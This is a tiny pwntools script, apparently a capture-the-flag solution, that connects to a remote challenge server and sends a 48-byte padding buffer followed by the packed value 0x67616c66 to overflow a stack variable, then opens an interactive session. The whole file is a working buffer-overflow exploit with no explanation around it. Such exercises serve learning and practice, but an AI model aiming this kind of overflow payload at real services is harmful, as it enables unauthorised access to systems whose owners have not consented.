from pwn import *

r = remote("thekidofarcrania.com", 35235)

p = b"a"*48 + p32(0x67616c66)
r.sendline(p)
r.interactive()